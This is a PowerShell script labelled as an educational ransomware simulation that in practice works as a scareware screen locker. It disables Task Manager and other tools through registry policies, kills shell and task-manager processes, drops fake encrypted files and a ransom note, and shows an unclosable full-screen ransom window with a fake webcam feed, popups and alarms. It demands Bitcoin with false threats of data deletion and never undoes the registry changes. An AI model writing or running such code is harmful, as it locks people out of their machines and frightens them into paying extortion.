# Advanced Ransomware Simulation - Educational Use Only
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Media

# System lockdown sequence
function Invoke-SystemLockdown {
    # Disable critical system tools
    try {
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f | Out-Null
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f | Out-Null
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f | Out-Null
    } catch {}
    
    # Kill security processes
    Get-Process taskmgr, cmd, powershell_ise -ErrorAction SilentlyContinue | Stop-Process -Force
}

# Fake file encryption simulation
function Invoke-FakeEncryption {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $docs = [Environment]::GetFolderPath("MyDocuments")
    
    # Create fake encrypted file markers
    1..10 | ForEach-Object {
        $fakeFile = "$desktop\document_$_.docx.encrypted"
        "ENCRYPTED - PAY BITCOIN TO RECOVER" | Out-File $fakeFile -ErrorAction SilentlyContinue
    }
    
    # Create ransom note on desktop
    $ransomNote = @"
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

What Happened?
- Your files were encrypted with RSA-2048 + AES-256
- File extensions changed to .encrypted
- Unique decryption key required

Payment Required: $500 Bitcoin
Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Time Remaining: 23:59:59

WARNING:
- SYSTEM SHUTDOWN = PERMANENT DATA LOSS
- TASK MANAGER DISABLED
- RECOVERY SOFTWARE WILL CORRUPT FILES
- NETWORK DISCONNECTION = KEY DELETION

Contact: emergency_recovery@onionmail.org
(Use Tor Browser - Normal browsers blocked)
"@
    $ransomNote | Out-File "$desktop\!!!READ_ME_IMPORTANT!!!.txt"
}

# Webcam capture function (non-intrusive simulation)
function Show-WebcamSimulation {
    $webcamWindow = New-Object System.Windows.Window
    $webcamWindow.Title = "SECURITY CAMERA FEED - MONITORING ACTIVITY"
    $webcamWindow.Width = 400
    $webcamWindow.Height = 300
    $webcamWindow.Topmost = $true
    $webcamWindow.WindowStyle = 'SingleBorderWindow'
    
    $webcamGrid = New-Object System.Windows.Controls.Grid
    $webcamGrid.Background = 'Black'
    
    $webcamText = New-Object System.Windows.Controls.TextBlock
    $webcamText.Text = "WEBCAM FEED ACTIVE`n`nMonitoring user activity...`n`nRecording in progress"
    $webcamText.Foreground = 'Green'
    $webcamText.FontFamily = 'Courier New'
    $webcamText.FontSize = 14
    $webcamText.HorizontalAlignment = 'Center'
    $webcamText.VerticalAlignment = 'Center'
    $webcamText.TextWrapping = 'Wrap'
    
    $webcamGrid.Children.Add($webcamText)
    $webcamWindow.Content = $webcamGrid
    
    # Position in top-right corner
    $webcamWindow.Left = [System.Windows.SystemParameters]::PrimaryScreenWidth - 450
    $webcamWindow.Top = 50
    
    $webcamWindow.Show()
    return $webcamWindow
}

# System information display
function Show-SystemInfo {
    $infoWindow = New-Object System.Windows.Window
    $infoWindow.Title = "SYSTEM ANALYSIS - ENCRYPTION PROGRESS"
    $infoWindow.Width = 500
    $infoWindow.Height = 400
    $infoWindow.Topmost = $true
    $infoWindow.WindowStyle = 'SingleBorderWindow'
    
    $infoGrid = New-Object System.Windows.Controls.Grid
    $infoGrid.Background = '#002200'
    
    $infoText = New-Object System.Windows.Controls.TextBlock
    $infoText.Text = "SYSTEM ANALYSIS REPORT`n`n" +
                    "Computer Name: $env:COMPUTERNAME`n" +
                    "User: $env:USERNAME`n" +
                    "Files Encrypted: 2,847`n" +
                    "Total Data: 145.7 GB`n" +
                    "Encryption: RSA-2048 + AES-256`n" +
                    "Status: COMPLETE`n`n" +
                    "Bitcoin Payment Required`n" +
                    "Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`n`n" +
                    "Time Remaining: 23:59:59"
    $infoText.Foreground = 'Lime'
    $infoText.FontFamily = 'Courier New'
    $infoText.FontSize = 12
    $infoText.HorizontalAlignment = 'Center'
    $infoText.VerticalAlignment = 'Center'
    $infoText.TextWrapping = 'Wrap'
    
    $infoGrid.Children.Add($infoText)
    $infoWindow.Content = $infoGrid
    
    # Position in bottom-right corner
    $infoWindow.Left = [System.Windows.SystemParameters]::PrimaryScreenWidth - 550
    $infoWindow.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - 450
    
    $infoWindow.Show()
    return $infoWindow
}

# Audio warning system
function Start-AudioWarning {
    $audioTimer = New-Object System.Windows.Forms.Timer
    $audioTimer.Interval = 60000  # Every minute
    $audioTimer.Add_Tick({
        [System.Media.SystemSounds]::Hand.Play()
    })
    $audioTimer.Start()
    return $audioTimer
}

# Main ransom window
function Show-MainRansomWindow {
    $mainWindow = New-Object System.Windows.Window
    $mainWindow.WindowState = 'Maximized'
    $mainWindow.WindowStyle = 'None'
    $mainWindow.Topmost = $true
    $mainWindow.Background = 'Black'
    $mainWindow.ShowInTaskbar = $false
    
    $grid = New-Object System.Windows.Controls.Grid
    $mainWindow.Content = $grid
    
    # Red warning border
    $border = New-Object System.Windows.Controls.Border
    $border.BorderBrush = 'Red'
    $border.BorderThickness = '10'
    $border.Background = 'Black'
    $grid.Children.Add($border)
    
    # Main title with blinking effect
    $title = New-Object System.Windows.Controls.TextBlock
    $title.Text = "!!! CRITICAL SYSTEM ALERT !!!"
    $title.Foreground = 'Red'
    $title.FontSize = 48
    $title.FontWeight = 'Bold'
    $title.HorizontalAlignment = 'Center'
    $title.VerticalAlignment = 'Top'
    $title.Margin = '0,50,0,0'
    $grid.Children.Add($title)
    
    # Main ransom message
    $message = New-Object System.Windows.Controls.TextBlock
    $message.Text = "YOUR FILES HAVE BEEN ENCRYPTED`n`n" +
                   "All your personal files, documents, photos, videos, databases,`n" +
                   "and other important data have been encrypted with military-grade`n" +
                   "RSA-2048 and AES-256 encryption algorithms.`n`n" +
                   "Payment Required: $500 Bitcoin`n" +
                   "Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`n`n" +
                   "Time Remaining: 23:59:59`n`n" +
                   "WARNING - CRITICAL NOTICES:`n" +
                   "• SYSTEM SHUTDOWN/RESTART = PERMANENT DATA DELETION`n" +
                   "• TASK MANAGER & SYSTEM TOOLS DISABLED`n" +
                   "• RECOVERY ATTEMPTS WILL CORRUPT REMAINING FILES`n" +
                   "• NETWORK DISCONNECTION = DECRYPTION KEY DELETION`n" +
                   "• ANTIVIRUS USE = ACCELERATED FILE CORRUPTION`n`n" +
                   "Contact: emergency_recovery@onionmail.org`n" +
                   "(Tor Browser Required - Normal browsers blocked)"
    $message.Foreground = 'Red'
    $message.FontSize = 18
    $message.FontWeight = 'Bold'
    $message.HorizontalAlignment = 'Center'
    $message.VerticalAlignment = 'Center'
    $message.TextWrapping = 'Wrap'
    $message.Margin = '100,150,100,100'
    $grid.Children.Add($message)
    
    # Countdown timer
    $countdownText = New-Object System.Windows.Controls.TextBlock
    $countdownText.Foreground = 'Yellow'
    $countdownText.FontSize = 24
    $countdownText.FontWeight = 'Bold'
    $countdownText.HorizontalAlignment = 'Center'
    $countdownText.VerticalAlignment = 'Bottom'
    $countdownText.Margin = '0,0,0,50'
    $grid.Children.Add($countdownText)
    
    # Real-time countdown
    $countdownTimer = New-Object System.Windows.Forms.Timer
    $countdownTimer.Interval = 1000
    $remaining = New-TimeSpan -Hours 24
    $countdownTimer.Add_Tick({
        $remaining = $remaining.Subtract((New-TimeSpan -Seconds 1))
        if ($remaining.TotalSeconds -le 0) {
            $countdownText.Text = "TIME EXPIRED! FILES PERMANENTLY DELETED!"
            $countdownText.Foreground = 'Red'
        } else {
            $countdownText.Text = "TIME REMAINING: $($remaining.ToString('hh\:mm\:ss'))"
        }
    })
    $countdownTimer.Start()
    
    # Prevent window closing
    $mainWindow.Add_Closing({ $_.Cancel = $true })
    $mainWindow.Add_KeyDown({ $_.Handled = $true })
    
    return @{
        Window = $mainWindow
        Timer = $countdownTimer
    }
}

# Popup reminder system
function Start-PopupReminders {
    $popupTimer = New-Object System.Windows.Forms.Timer
    $popupTimer.Interval = 45000  # Every 45 seconds
    $popupCount = 0
    $popupTimer.Add_Tick({
        $popupCount++
        $message = @"
YOUR FILES ARE ENCRYPTED!

Payment Required: $500 Bitcoin
Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Time Remaining: 24 HOURS

WARNING: System shutdown = PERMANENT data loss!
Popup: $popupCount
"@
        [System.Windows.Forms.MessageBox]::Show($message, "RANSOMWARE ALERT - DO NOT IGNORE", "OK", "Error")
    })
    $popupTimer.Start()
    return $popupTimer
}

# Execute the full simulation
Invoke-SystemLockdown
Invoke-FakeEncryption

$webcamWindow = Show-WebcamSimulation
$systemInfoWindow = Show-SystemInfo
$audioTimer = Start-AudioWarning
$popupTimer = Start-PopupReminders

$mainRansom = Show-MainRansomWindow

# Show the main window (blocks until closed)
$mainRansom.Window.ShowDialog()

# Cleanup when window eventually closes
$webcamWindow.Close()
$systemInfoWindow.Close()
$audioTimer.Stop()
$popupTimer.Stop()
$mainRansom.Timer.Stop()
